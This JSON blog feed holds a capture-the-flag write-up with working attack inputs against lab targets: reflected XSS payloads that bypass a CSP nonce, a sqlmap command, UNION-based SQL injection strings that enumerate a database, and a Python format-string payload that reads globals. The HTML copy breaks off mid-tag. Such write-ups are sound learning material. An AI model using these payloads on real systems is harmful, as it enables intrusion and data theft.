{
    "version": "https://jsonfeed.org/version/1",
    "title": "Just a blog",
    "home_page_url": "mediocreone.com/",
    "feed_url": "mediocreone.com/feed.json",
    "description": "Piece of my mumbling.",
    "icon": "mediocreone.com/apple-touch-icon.png",
    "favicon": "mediocreone.com/favicon.ico",
    "expired": false,
    
    "author":  {
        "name": "mediocre_one",
        "url": null,
        "avatar": null
    },
    
"items": [
    
        {
            "id": "mediocreone.com/2021/03/14/break-the-syntax",
            "title": "Break the syntax",
            "summary": "Break the syntax CTF notes",
            "content_text": "It’s has been a while since I played CTF games. Anyway, I share my struggles as an amateur player.1. Web challenge - Never gonna give you flagThis landing page contained 6 links where 2 of them contained below interesting codes.&lt;html&gt;&lt;head&gt;&lt;script src=\"jquery-3.5.1.min.js\"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;  &lt;div&gt; Rick never gonna: &lt;/div&gt;  &lt;p id=\"rick-says\"&gt;  &lt;/p&gt;  &lt;img src=\"images/rick6.jpg\"&gt;  &lt;script nonce=\"JIYr435smMmKG1nAAFNlrKUewAEaTWt1\"&gt;    var arg = decodeURIComponent(window.location.search.substr(1).split('=')[1]);    if (arg !== \"undefined\") {      $('#rick-says').append(arg);    }      //console.log(arg)  &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;&lt;html&gt;&lt;head&gt;&lt;script src=\"jquery-3.5.1.min.js\"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;  &lt;img src=\"images/rick2.jpg\" nonce=\"JIYr435smMmKG1nAAFNlrKUewAEaTWt1\"&gt;  &lt;script nonce=\"JIYr435smMmKG1nAAFNlrKUewAEaTWt1\"&gt;    $.ajax({      url: \"flag.php\",      headers: {        \"Nonce\": \"JIYr435smMmKG1nAAFNlrKUewAEaTWt1\"      },      success: function (result) {        console.log(result);      }    });  &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;The first page exposed XSS vulnerability and the second one hinted toward the flag. My first task was to successfully get XSS! message in the developer console../Never_gonna_say_goodbye.html?search=&lt;script&gt;console.log(\"XSS!\")&lt;/script&gt;This attempt threw a Content Security Policy error in the developer console. So fixed it with my second try../Never_gonna_say_goodbye.html?search=&lt;script nonce=\"JIYr435smMmKG1nAAFNlrKUewAEaTWt1\"&gt;console.log(\"XSS!\")&lt;/script&gt;The previous error was gone but the arg variable held only &lt;script nonce part from my payload. So replaced = sign with %3D to get around the split../Never_gonna_say_goodbye.html?search=&lt;script nonce%3D\"JIYr435smMmKG1nAAFNlrKUewAEaTWt1\"&gt;console.log(\"XSS!\")&lt;/script&gt;Finally, the “XSS!” message arrived in the dev console. Good to go for the flag../Never_gonna_say_goodbye.html?search=&lt;script nonce%3D\"JIYr435smMmKG1nAAFNlrKUewAEaTWt1\"&gt;$.ajax({ url: \"flag.php\", headers: { \"Nonce\": \"JIYr435smMmKG1nAAFNlrKUewAEaTWt1\" }, success: function (r) { console.log(r); } });&lt;/script&gt;The flag received in the dev console: BtS-CTF{r1cK_g4v3_uP_y0ure_h3lpl3ss}.2. Web challenge - Cheated lotteryThe landing page source hinted at the /?source=1 endpoint that contained the server-side code.from flask import Flask, render_template, request from dotenv import load_dotenv import mysql.connector import os load_dotenv() def get_coupons(form):  coupons = list()  mydb = mysql.connector.connect( host=os.getenv('mysql_host'), user=os.getenv('mysql_user'), password=os.getenv('mysql_pwd'), database=os.getenv('mysql_db') ) mycursor = mydb.cursor()  try:    mycursor.execute(\"SELECT * FROM coupons WHERE code = '\" + str(form['cid']) + \"'\")  except:    pass      myresult = mycursor.fetchall()      for x in myresult:        coupons.append({ 'code': x[1], 'value': x[2] })        mycursor.close()        return couponsapp = Flask(__name__)@app.route('/', methods=['POST', 'GET'])def index(source=None):  if request.method == \"POST\":    coupons = get_coupons(request.form)    if coupons == []:      return render_template('list.html', error=\"Sorry, you didn't win\")    else:      return render_template('list.html', coupons=coupons)  else:    if request.args.get('source') == '1':      with open(__file__, 'r') as r:        return r.read().strip()    else:      return render_template('base.html')if __name__ == \"__main__\":  app.run(host=\"0.0.0.0\", port=7331)The code section to query MySQL database is intentionally left exposed to SQL Injections.sqlmap -r ./request.txt -p cidThe SQLmap tool reported that UNION attack with 3 columns is the way to go.My first injection was for acquiring the database name: test' UNION SELECT DATABASE(), DATABASE(), DATABASE() WHERE 'x' = 'xThe actual executed query becomes:SELECT * FROM coupons WHERE code = 'test' UNION SELECT DATABASE(), DATABASE(), DATABASE() WHERE 'x' = 'x'Received the database name as ff86e476b1344851f095759d1eeccda72d9363ad. The second injection was to list all tables in this database: test' UNION SELECT NULL, table_name, table_type FROM information_schema.tables WHERE 'x' = 'xThe correctly executed query becomes:SELECT * FROM coupons WHERE code = 'test' UNION SELECT NULL, table_name, table_type FROM information_schema.tables WHERE 'x' = 'x'Revealed table names were c2VjcmV0LWRi and coupons. The third injection was to get column names of the c2VjcmV0LWRi table: test' UNION SELECT NULL, column_name, column_name FROM information_schema.columns WHERE table_schema  = 'ff86e476b1344851f095759d1eeccda72d9363ad' AND table_name = 'c2VjcmV0LWRi The correctly executed query becomes:SELECT * FROM coupons WHERE code = 'test' UNION SELECT NULL, column_name, column_name FROM information_schema.columns WHERE table_schema  = 'ff86e476b1344851f095759d1eeccda72d9363ad' AND table_name = 'c2VjcmV0LWRi'Revealed only one column named ZGVmaW5pdGVseS1ub3QtZmxhZw. The fourth injection explored the data of the c2VjcmV0LWRi table: test' UNION SELECT NULL, ZGVmaW5pdGVseS1ub3QtZmxhZw, ZGVmaW5pdGVseS1ub3QtZmxhZw FROM c2VjcmV0LWRi WHERE 'x' = 'xThe correctly executed query becomes:SELECT * FROM coupons WHERE code = 'test' UNION SELECT NULL, ZGVmaW5pdGVseS1ub3QtZmxhZw, ZGVmaW5pdGVseS1ub3QtZmxhZw FROM c2VjcmV0LWRi WHERE 'x' = 'x'The flag BtS-CTF{7h475_h0w_y0u_ch347_1n_94m35} was only thing in table c2VjcmV0LWRi.3. OSINT challenge - Lost Photos  God! All my photos from Moscow are gone, Hard disk had some problems, Usually it happens to my friends, Not to me, Thomas Garminas will be so upset.PS.: When you find what you are looking for, just put it between curly brackets and win this challengeSubmitting BtS-CTF{02.12.2017} failed. I was afraid that the flag might be in this silent video.By luck, Firefox saved the day. Chrome was not showing the hint. BtS-CTF{Amaranthe} - accepted.4. Misc challenge - Simple game calculatorA simple python game source code was exposed via the debug option.import os, sysclass Multiplayer(object):    def __init__(self, name, difficulty, players):        self.name = name        self.difficulty = \"easy\" # No one will create hard game, no need to implement it        self.players = players    def show_details(self):        print('{0.players} can play this easy game called' + self.name).format(self)class CTFGame(object):    def __init__(self):        self.flag = \"asd\"games = {    'multi': list()}def user_choice():    menu = \"\"\"    Welcome to Simple Game Creator where you can create your game of choice!    1. View all games    2. Create your own multiplayer game    \"\"\"    print(menu)    sys.stdout.write(\"Choose wisely &gt;&gt; \")    sys.stdout.flush()    return sys.stdin.readline()def add_multi():    sys.stdout.write(\"Name your own multiplayer game &gt;&gt; \")    sys.stdout.flush()    name = sys.stdin.readline().strip()    sys.stdout.write(\"What difficulty will it have (hard, easy)? &gt;&gt; \")    sys.stdout.flush()    diff = sys.stdin.readline().strip()    sys.stdout.write(\"How many players can play this? &gt;&gt; \")    sys.stdout.flush()    players = sys.stdin.readline().strip()    games['multi'].append(Multiplayer(name, diff, players))    print(\"You created your own multiplayer game\")def show_games():    print(\"\\nYour games: \")    print(\"\\nMultiplayers: \")    for multi in games['multi']:        multi.show_details()    print(\"\")def main():    banner = \"\"\"Banner\"\"\"    while True:        print(banner)        sys.stdout.flush()        choice = user_choice().strip()        choices = {            '1': show_games,            '2': add_multi        }        ans = choices.get(choice, None)        if not ans:            print(\"There is no such option mate\")        else:            ans()if __name__ == \"__main__\":    main()Several years ago, I read an article about the format string vulnerability in C code. Until today, I never imagined the concept can be applied to python as well. The only thing fishy in the code was the print statement with formatting. Google: “format string vulnerability python” yielded this GeeksForGeeks article. I was able to manage to come up with  {0.__init__.__globals__} to read the flag in the game. Anyway, these were all the challenges that I successfully solved during the live event. Event ended about an hour ago, organizers have already published everything to this git repository.Thanks to those who organized and sponsored the event. It was a really fun experience for me after all.",
            "content_html": "<p>It’s has been a while since I played CTF games. Anyway, I share my struggles as an amateur player.</p><h3 id=\"1-web-challenge---never-gonna-give-you-flag\">1. Web challenge - Never gonna give you flag</h3><p><img src=\"/assets/img/never-gonna-give-you-flag.png\" alt=\"Landing page\" /></p><p>This landing page contained 6 links where 2 of them contained below interesting codes.</p><div class=\"language-html highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nt\">&lt;html&gt;</span><span class=\"nt\">&lt;head&gt;&lt;script </span><span class=\"na\">src=</span><span class=\"s\">\"jquery-3.5.1.min.js\"</span><span class=\"nt\">&gt;&lt;/script&gt;&lt;/head&gt;</span><span class=\"nt\">&lt;body&gt;</span>  <span class=\"nt\">&lt;div&gt;</span> Rick never gonna: <span class=\"nt\">&lt;/div&gt;</span>  <span class=\"nt\">&lt;p</span> <span class=\"na\">id=</span><span class=\"s\">\"rick-says\"</span><span class=\"nt\">&gt;</span>  <span class=\"nt\">&lt;/p&gt;</span>  <span class=\"nt\">&lt;img</span> <span class=\"na\">src=</span><span class=\"s\">\"images/rick6.jpg\"</span><span class=\"nt\">&gt;</span>  <span class=\"nt\">&lt;script </span><span class=\"na\">nonce=</span><span class=\"s\">\"JIYr435smMmKG1nAAFNlrKUewAEaTWt1\"</span><span class=\"nt\">&gt;</span>    <span class=\"kd\">var</span> <span class=\"nx\">arg</span> <span class=\"o\">=</span> <span class=\"nb\">decodeURIComponent</span><span class=\"p\">(</span><span class=\"nb\">window</span><span class=\"p\">.</span><span class=\"nx\">location</span><span class=\"p\">.</span><span class=\"nx\">search</span><span class=\"p\">.</span><span class=\"nx\">substr</span><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">).</span><span class=\"nx\">split</span><span class=\"p\">(</span><span class=\"dl\">'</span><span class=\"s1\">=</span><span class=\"dl\">'</span><span class=\"p\">)[</span><span class=\"mi\">1</span><span class=\"p\">]);</span>    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">arg</span> <span class=\"o\">!==</span> <span class=\"dl\">\"</span><span class=\"s2\">undefined</span><span class=\"dl\">\"</span><span class=\"p\">)</span> <span class=\"p\">{</span>      <span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"dl\">'</span><span class=\"s1\">#rick-says</span><span class=\"dl\">'</span><span class=\"p\">).</span><span class=\"nx\">append</span><span class=\"p\">(</span><span class=\"nx\">arg</span><span class=\"p\">);</span>    <span class=\"p\">}</span>      <span class=\"c1\">//console.log(arg)</span>  <span class=\"nt\">&lt;/script&gt;</span><span class=\"nt\">&lt;/body&gt;</span><span class=\"nt\">&lt;/html&gt;</span></code></pre></div></div><div class=\"language-html highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nt\">&lt;html&gt;</span><span class=\"nt\">&lt;head&gt;&lt;script </span><span class=\"na\">src=</span><span class=\"s\">\"jquery-3.5.1.min.js\"</span><span class=\"nt\">&gt;&lt;/script&gt;&lt;/head&gt;</span><span class=\"nt\">&lt;body&gt;</span>  <span class=\"nt\">&lt;img</span> <span class=\"na\">src=</span><span class=\"s\">\"images/rick2.jpg\"</span> <span class=\"na\">nonce=</span><span class=\"s\">\"JIYr435smMmKG1nAAFNlrKUewAEaTWt1\"</span><span class=\"nt\">&gt;</span>  <span class=\"nt\">&lt;script </span><span class=\"na\">nonce=</span><span class=\"s\">\"JIYr435smMmKG1nAAFNlrKUewAEaTWt1\"</span><span class=\"nt\">&gt;</span>    <span class=\"nx\">$</span><span class=\"p\">.</span><span class=\"nx\">ajax</span><span class=\"p\">({</span>      <span class=\"na\">url</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">flag.php</span><span class=\"dl\">\"</span><span class=\"p\">,</span>      <span class=\"na\">headers</span><span class=\"p\">:</span> <span class=\"p\">{</span>        <span class=\"dl\">\"</span><span class=\"s2\">Nonce</span><span class=\"dl\">\"</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">JIYr435smMmKG1nAAFNlrKUewAEaTWt1</span><span class=\"dl\">\"</span>      <span class=\"p\">},</span>      <span class=\"na\">success</span><span class=\"p\">:</span> <span class=\"kd\">function</span> <span class=\"p\">(</span><span class=\"nx\">result</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"nx\">result</span><span class=\"p\">);</span>      <span class=\"p\">}</span>    <span class=\"p\">});</span>  <span class=\"nt\">&lt;/script&gt;</span><span class=\"nt\">&lt;/body&gt;</span><span class=\"nt\">&lt;/html&gt;</span></code></pre></div></div><p>The first page exposed XSS vulnerability and the second one hinted toward the flag. My first task was to successfully get <code class=\"language-plaintext highlighter-rouge\">XSS!</code> message in the developer console.</p><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>./Never_gonna_say_goodbye.html?search=&lt;script&gt;console.log(\"XSS!\")&lt;/script&gt;</code></pre></div></div><p>This attempt threw a Content Security Policy error in the developer console. So fixed it with my second try.</p><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>./Never_gonna_say_goodbye.html?search=&lt;script nonce=\"JIYr435smMmKG1nAAFNlrKUewAEaTWt1\"&gt;console.log(\"XSS!\")&lt;/script&gt;</code></pre></div></div><p>The previous error was gone but the <code class=\"language-plaintext highlighter-rouge\">arg</code> variable held only <code class=\"language-plaintext highlighter-rouge\">&lt;script nonce</code> part from my payload. So replaced <code class=\"language-plaintext highlighter-rouge\">=</code> sign with <code class=\"language-plaintext highlighter-rouge\">%3D</code> to get around the split.</p><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>./Never_gonna_say_goodbye.html?search=&lt;script nonce%3D\"JIYr435smMmKG1nAAFNlrKUewAEaTWt1\"&gt;console.log(\"XSS!\")&lt;/script&gt;</code></pre></div></div><p>Finally, the “XSS!” message arrived in the dev console. Good to go for the flag.</p><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>./Never_gonna_say_goodbye.html?search=&lt;script nonce%3D\"JIYr435smMmKG1nAAFNlrKUewAEaTWt1\"&gt;$.ajax({ url: \"flag.php\", headers: { \"Nonce\": \"JIYr435smMmKG1nAAFNlrKUewAEaTWt1\" }, success: function (r) { console.log(r); } });&lt;/script&gt;</code></pre></div></div><p>The flag received in the dev console: <code class=\"language-plaintext highlighter-rouge\">BtS-CTF{r1cK_g4v3_uP_y0ure_h3lpl3ss}</code>.</p><hr /><h3 id=\"2-web-challenge---cheated-lottery\">2. Web challenge - Cheated lottery</h3><p><img src=\"/assets/img/cheated-lottery.png\" alt=\"Landing page\" />The landing page source hinted at the <code class=\"language-plaintext highlighter-rouge\">/?source=1</code> endpoint that contained the server-side code.</p><div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"kn\">from</span> <span class=\"nn\">flask</span> <span class=\"kn\">import</span> <span class=\"n\">Flask</span><span class=\"p\">,</span> <span class=\"n\">render_template</span><span class=\"p\">,</span> <span class=\"n\">request</span> <span class=\"kn\">from</span> <span class=\"nn\">dotenv</span> <span class=\"kn\">import</span> <span class=\"n\">load_dotenv</span> <span class=\"kn\">import</span> <span class=\"nn\">mysql.connector</span> <span class=\"kn\">import</span> <span class=\"nn\">os</span> <span class=\"n\">load_dotenv</span><span class=\"p\">()</span> <span class=\"k\">def</span> <span class=\"nf\">get_coupons</span><span class=\"p\">(</span><span class=\"n\">form</span><span class=\"p\">):</span>  <span class=\"n\">coupons</span> <span class=\"o\">=</span> <span class=\"nb\">list</span><span class=\"p\">()</span>  <span class=\"n\">mydb</span> <span class=\"o\">=</span> <span class=\"n\">mysql</span><span class=\"p\">.</span><span class=\"n\">connector</span><span class=\"p\">.</span><span class=\"n\">connect</span><span class=\"p\">(</span> <span class=\"n\">host</span><span class=\"o\">=</span><span class=\"n\">os</span><span class=\"p\">.</span><span class=\"n\">getenv</span><span class=\"p\">(</span><span class=\"s\">'mysql_host'</span><span class=\"p\">),</span> <span class=\"n\">user</span><span class=\"o\">=</span><span class=\"n\">os</span><span class=\"p\">.</span><span class=\"n\">getenv</span><span class=\"p\">(</span><span class=\"s\">'mysql_user'</span><span class=\"p\">),</span> <span class=\"n\">password</span><span class=\"o\">=</span><span class=\"n\">os</span><span class=\"p\">.</span><span class=\"n\">getenv</span><span class=\"p\">(</span><span class=\"s\">'mysql_pwd'</span><span class=\"p\">),</span> <span class=\"n\">database</span><span class=\"o\">=</span><span class=\"n\">os</span><span class=\"p\">.</span><span class=\"n\">getenv</span><span class=\"p\">(</span><span class=\"s\">'mysql_db'</span><span class=\"p\">)</span> <span class=\"p\">)</span> <span class=\"n\">mycursor</span> <span class=\"o\">=</span> <span class=\"n\">mydb</span><span class=\"p\">.</span><span class=\"n\">cursor</span><span class=\"p\">()</span>  <span class=\"k\">try</span><span class=\"p\">:</span>    <span class=\"n\">mycursor</span><span class=\"p\">.</span><span class=\"n\">execute</span><span class=\"p\">(</span><span class=\"s\">\"SELECT * FROM coupons WHERE code = '\"</span> <span class=\"o\">+</span> <span class=\"nb\">str</span><span class=\"p\">(</span><span class=\"n\">form</span><span class=\"p\">[</span><span class=\"s\">'cid'</span><span class=\"p\">])</span> <span class=\"o\">+</span> <span class=\"s\">\"'\"</span><span class=\"p\">)</span>  <span class=\"k\">except</span><span class=\"p\">:</span>    <span class=\"k\">pass</span>      <span class=\"n\">myresult</span> <span class=\"o\">=</span> <span class=\"n\">mycursor</span><span class=\"p\">.</span><span class=\"n\">fetchall</span><span class=\"p\">()</span>      <span class=\"k\">for</span> <span class=\"n\">x</span> <span class=\"ow\">in</span> <span class=\"n\">myresult</span><span class=\"p\">:</span>        <span class=\"n\">coupons</span><span class=\"p\">.</span><span class=\"n\">append</span><span class=\"p\">({</span> <span class=\"s\">'code'</span><span class=\"p\">:</span> <span class=\"n\">x</span><span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">],</span> <span class=\"s\">'value'</span><span class=\"p\">:</span> <span class=\"n\">x</span><span class=\"p\">[</span><span class=\"mi\">2</span><span class=\"p\">]</span> <span class=\"p\">})</span>        <span class=\"n\">mycursor</span><span class=\"p\">.</span><span class=\"n\">close</span><span class=\"p\">()</span>        <span class=\"k\">return</span> <span class=\"n\">coupons</span><span class=\"n\">app</span> <span class=\"o\">=</span> <span class=\"n\">Flask</span><span class=\"p\">(</span><span class=\"n\">__name__</span><span class=\"p\">)</span><span class=\"o\">@</span><span class=\"n\">app</span><span class=\"p\">.</span><span class=\"n\">route</span><span class=\"p\">(</span><span class=\"s\">'/'</span><span class=\"p\">,</span> <span class=\"n\">methods</span><span class=\"o\">=</span><span class=\"p\">[</span><span class=\"s\">'POST'</span><span class=\"p\">,</span> <span class=\"s\">'GET'</span><span class=\"p\">])</span><span class=\"k\">def</span> <span class=\"nf\">index</span><span class=\"p\">(</span><span class=\"n\">source</span><span class=\"o\">=</span><span class=\"bp\">None</span><span class=\"p\">):</span>  <span class=\"k\">if</span> <span class=\"n\">request</span><span class=\"p\">.</span><span class=\"n\">method</span> <span class=\"o\">==</span> <span class=\"s\">\"POST\"</span><span class=\"p\">:</span>    <span class=\"n\">coupons</span> <span class=\"o\">=</span> <span class=\"n\">get_coupons</span><span class=\"p\">(</span><span class=\"n\">request</span><span class=\"p\">.</span><span class=\"n\">form</span><span class=\"p\">)</span>    <span class=\"k\">if</span> <span class=\"n\">coupons</span> <span class=\"o\">==</span> <span class=\"p\">[]:</span>      <span class=\"k\">return</span> <span class=\"n\">render_template</span><span class=\"p\">(</span><span class=\"s\">'list.html'</span><span class=\"p\">,</span> <span class=\"n\">error</span><span class=\"o\">=</span><span class=\"s\">\"Sorry, you didn't win\"</span><span class=\"p\">)</span>    <span class=\"k\">else</span><span class=\"p\">:</span>      <span class=\"k\">return</span> <span class=\"n\">render_template</span><span class=\"p\">(</span><span class=\"s\">'list.html'</span><span class=\"p\">,</span> <span class=\"n\">coupons</span><span class=\"o\">=</span><span class=\"n\">coupons</span><span class=\"p\">)</span>  <span class=\"k\">else</span><span class=\"p\">:</span>    <span class=\"k\">if</span> <span class=\"n\">request</span><span class=\"p\">.</span><span class=\"n\">args</span><span class=\"p\">.</span><span class=\"n\">get</span><span class=\"p\">(</span><span class=\"s\">'source'</span><span class=\"p\">)</span> <span class=\"o\">==</span> <span class=\"s\">'1'</span><span class=\"p\">:</span>      <span class=\"k\">with</span> <span class=\"nb\">open</span><span class=\"p\">(</span><span class=\"n\">__file__</span><span class=\"p\">,</span> <span class=\"s\">'r'</span><span class=\"p\">)</span> <span class=\"k\">as</span> <span class=\"n\">r</span><span class=\"p\">:</span>        <span class=\"k\">return</span> <span class=\"n\">r</span><span class=\"p\">.</span><span class=\"n\">read</span><span class=\"p\">().</span><span class=\"n\">strip</span><span class=\"p\">()</span>    <span class=\"k\">else</span><span class=\"p\">:</span>      <span class=\"k\">return</span> <span class=\"n\">render_template</span><span class=\"p\">(</span><span class=\"s\">'base.html'</span><span class=\"p\">)</span><span class=\"k\">if</span> <span class=\"n\">__name__</span> <span class=\"o\">==</span> <span class=\"s\">\"__main__\"</span><span class=\"p\">:</span>  <span class=\"n\">app</span><span class=\"p\">.</span><span class=\"n\">run</span><span class=\"p\">(</span><span class=\"n\">host</span><span class=\"o\">=</span><span class=\"s\">\"0.0.0.0\"</span><span class=\"p\">,</span> <span class=\"n\">port</span><span class=\"o\">=</span><span class=\"mi\">7331</span><span class=\"p\">)</span></code></pre></div></div><p>The code section to query MySQL database is intentionally left exposed to SQL Injections.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>sqlmap <span class=\"nt\">-r</span> ./request.txt <span class=\"nt\">-p</span> cid</code></pre></div></div><p>The SQLmap tool reported that <code class=\"language-plaintext highlighter-rouge\">UNION attack</code> with 3 columns is the way to go.My first injection was for acquiring the database name: <code class=\"language-plaintext highlighter-rouge\">test' UNION SELECT DATABASE(), DATABASE(), DATABASE() WHERE 'x' = 'x</code><br />The actual executed query becomes:</p><pre><code class=\"language-SQL\">SELECT * FROM coupons WHERE code = 'test' UNION SELECT DATABASE(), DATABASE(), DATABASE() WHERE 'x' = 'x'</code></pre><p>Received the database name as <code class=\"language-plaintext highlighter-rouge\">ff86e476b1344851f095759d1eeccda72d9363ad</code>. The second injection was to list all tables in this database: <code class=\"language-plaintext highlighter-rouge\">test' UNION SELECT NULL, table_name, table_type FROM information_schema.tables WHERE 'x' = 'x</code><br />The correctly executed query becomes:</p><pre><code class=\"language-SQL\">SELECT * FROM coupons WHERE code = 'test' UNION SELECT NULL, table_name, table_type FROM information_schema.tables WHERE 'x' = 'x'</code></pre><p>Revealed table names were <code class=\"language-plaintext highlighter-rouge\">c2VjcmV0LWRi</code> and <code class=\"language-plaintext highlighter-rouge\">coupons</code>. The third injection was to get column names of the <code class=\"language-plaintext highlighter-rouge\">c2VjcmV0LWRi</code> table: <code class=\"language-plaintext highlighter-rouge\">test' UNION SELECT NULL, column_name, column_name FROM information_schema.columns WHERE table_schema  = 'ff86e476b1344851f095759d1eeccda72d9363ad' AND table_name = 'c2VjcmV0LWRi</code> <br />The correctly executed query becomes:</p><pre><code class=\"language-SQL\">SELECT * FROM coupons WHERE code = 'test' UNION SELECT NULL, column_name, column_name FROM information_schema.columns WHERE table_schema  = 'ff86e476b1344851f095759d1eeccda72d9363ad' AND table_name = 'c2VjcmV0LWRi'</code></pre><p>Revealed only one column named <code class=\"language-plaintext highlighter-rouge\">ZGVmaW5pdGVseS1ub3QtZmxhZw</code>. The fourth injection explored the data of the <code class=\"language-plaintext highlighter-rouge\">c2VjcmV0LWRi</code> table: <code class=\"language-plaintext highlighter-rouge\">test' UNION SELECT NULL, ZGVmaW5pdGVseS1ub3QtZmxhZw, ZGVmaW5pdGVseS1ub3QtZmxhZw FROM c2VjcmV0LWRi WHERE 'x' = 'x</code><br />The correctly executed query becomes:</p><pre><code class=\"language-SQL\">SELECT * FROM coupons WHERE code = 'test' UNION SELECT NULL, ZGVmaW5pdGVseS1ub3QtZmxhZw, ZGVmaW5pdGVseS1ub3QtZmxhZw FROM c2VjcmV0LWRi WHERE 'x' = 'x'</code></pre><p>The flag <code class=\"language-plaintext highlighter-rouge\">BtS-CTF{7h475_h0w_y0u_ch347_1n_94m35}</code> was only thing in table <code class=\"language-plaintext highlighter-rouge\">c2VjcmV0LWRi</code>.</p><hr /><h3 id=\"3-osint-challenge---lost-photos\">3. OSINT challenge - Lost Photos</h3><blockquote>  <p>God! All my photos from Moscow are gone, Hard disk had some problems, Usually it happens to my friends, Not to me, Thomas Garminas will be so upset.PS.: When you find what you are looking for, just put it between curly brackets and win this challenge</p></blockquote><p><img src=\"/assets/img/lost-photos.png\" alt=\"Google Thomas Garminas\" /><img src=\"/assets/img/lost-photos-1.png\" alt=\"Thomas Garminas - Youtube channel\" />Submitting <code class=\"language-plaintext highlighter-rouge\">BtS-CTF{02.12.2017}</code> failed. I was afraid that the flag might be in this silent video.</p><p><img src=\"/assets/img/lost-photos-2.png\" alt=\"Google Thomas Garminas - Firefox\" /><img src=\"/assets/img/lost-photos-3.png\" alt=\"Google concert 02.12.2017 - Firefox\" />By luck, Firefox saved the day. Chrome was not showing the hint. <code class=\"language-plaintext highlighter-rouge\">BtS-CTF{Amaranthe}</code> - accepted.</p><hr /><h3 id=\"4-misc-challenge---simple-game-calculator\">4. Misc challenge - Simple game calculator</h3><p>A simple python game source code was exposed via the debug option.</p><div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"kn\">import</span> <span class=\"nn\">os</span><span class=\"p\">,</span> <span class=\"n\">sys</span><span class=\"k\">class</span> <span class=\"nc\">Multiplayer</span><span class=\"p\">(</span><span class=\"nb\">object</span><span class=\"p\">):</span>    <span class=\"k\">def</span> <span class=\"nf\">__init__</span><span class=\"p\">(</span><span class=\"bp\">self</span><span class=\"p\">,</span> <span class=\"n\">name</span><span class=\"p\">,</span> <span class=\"n\">difficulty</span><span class=\"p\">,</span> <span class=\"n\">players</span><span class=\"p\">):</span>        <span class=\"bp\">self</span><span class=\"p\">.</span><span class=\"n\">name</span> <span class=\"o\">=</span> <span class=\"n\">name</span>        <span class=\"bp\">self</span><span class=\"p\">.</span><span class=\"n\">difficulty</span> <span class=\"o\">=</span> <span class=\"s\">\"easy\"</span> <span class=\"c1\"># No one will create hard game, no need to implement it</span>        <span class=\"bp\">self</span><span class=\"p\">.</span><span class=\"n\">players</span> <span class=\"o\">=</span> <span class=\"n\">players</span>    <span class=\"k\">def</span> <span class=\"nf\">show_details</span><span class=\"p\">(</span><span class=\"bp\">self</span><span class=\"p\">):</span>        <span class=\"k\">print</span><span class=\"p\">(</span><span class=\"s\">'{0.players} can play this easy game called'</span> <span class=\"o\">+</span> <span class=\"bp\">self</span><span class=\"p\">.</span><span class=\"n\">name</span><span class=\"p\">).</span><span class=\"nb\">format</span><span class=\"p\">(</span><span class=\"bp\">self</span><span class=\"p\">)</span><span class=\"k\">class</span> <span class=\"nc\">CTFGame</span><span class=\"p\">(</span><span class=\"nb\">object</span><span class=\"p\">):</span>    <span class=\"k\">def</span> <span class=\"nf\">__init__</span><span class=\"p\">(</span><span class=\"bp\">self</span><span class=\"p\">):</span>        <span class=\"bp\">self</span><span class=\"p\">.</span><span class=\"n\">flag</span> <span class=\"o\">=</span> <span class=\"s\">\"asd\"</span><span class=\"n\">games</span> <span class=\"o\">=</span> <span class=\"p\">{</span>    <span class=\"s\">'multi'</span><span class=\"p\">:</span> <span class=\"nb\">list</span><span class=\"p\">()</span><span class=\"p\">}</span><span class=\"k\">def</span> <span class=\"nf\">user_choice</span><span class=\"p\">():</span>    <span class=\"n\">menu</span> <span class=\"o\">=</span> <span class=\"s\">\"\"\"    Welcome to Simple Game Creator where you can create your game of choice!    1. View all games    2. Create your own multiplayer game    \"\"\"</span>    <span class=\"k\">print</span><span class=\"p\">(</span><span class=\"n\">menu</span><span class=\"p\">)</span>    <span class=\"n\">sys</span><span class=\"p\">.</span><span class=\"n\">stdout</span><span class=\"p\">.</span><span class=\"n\">write</span><span class=\"p\">(</span><span class=\"s\">\"Choose wisely &gt;&gt; \"</span><span class=\"p\">)</span>    <span class=\"n\">sys</span><span class=\"p\">.</span><span class=\"n\">stdout</span><span class=\"p\">.</span><span class=\"n\">flush</span><span class=\"p\">()</span>    <span class=\"k\">return</span> <span class=\"n\">sys</span><span class=\"p\">.</span><span class=\"n\">stdin</span><span class=\"p\">.</span><span class=\"n\">readline</span><span class=\"p\">()</span><span class=\"k\">def</span> <span class=\"nf\">add_multi</span><span class=\"p\">():</span>    <span class=\"n\">sys</span><span class=\"p\">.</span><span class=\"n\">stdout</span><span class=\"p\">.</span><span class=\"n\">write</span><span class=\"p\">(</span><span class=\"s\">\"Name your own multiplayer game &gt;&gt; \"</span><span class=\"p\">)</span>    <span class=\"n\">sys</span><span class=\"p\">.</span><span class=\"n\">stdout</span><span class=\"p\">.</span><span class=\"n\">flush</span><span class=\"p\">()</span>    <span class=\"n\">name</span> <span class=\"o\">=</span> <span class=\"n\">sys</span><span class=\"p\">.</span><span class=\"n\">stdin</span><span class=\"p\">.</span><span class=\"n\">readline</span><span class=\"p\">().</span><span class=\"n\">strip</span><span class=\"p\">()</span>    <span class=\"n\">sys</span><span class=\"p\">.</span><span class=\"n\">stdout</span><span class=\"p\">.</span><span class=\"n\">write</span><span 